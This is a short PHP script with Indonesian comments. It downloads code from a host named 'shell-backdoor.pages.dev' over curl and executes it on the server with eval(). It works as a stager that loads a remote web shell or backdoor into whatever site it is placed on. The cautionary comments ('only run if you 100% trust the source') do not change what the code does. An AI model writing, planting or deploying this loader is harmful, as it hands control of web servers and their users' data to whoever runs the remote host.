<?php
// AMAN: Hanya jika Anda benar-benar memiliki akses ke file ini
$domain = "shell-backdoor.pages.dev/";
$file_path = "/minfo.php";
$protocol = isset($_SERVER['HTTPS']) ? "https" : "http";
$url = $protocol . "://" . $domain . $file_path;

function fetch_with_curl($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); // HARUS true untuk keamanan
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2); // HARUS 2 untuk keamanan
    $data = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);
    
    if ($error) {
        error_log("CURL Error: " . $error);
        return false;
    }
    return $data;
}

$content = fetch_with_curl($url);
if ($content !== false) {
    // HANYA jalankan jika Anda 100% percaya dengan sumbernya
    eval("?>" . $content);
} else {
    echo "Gagal mengambil konten";
}
?>
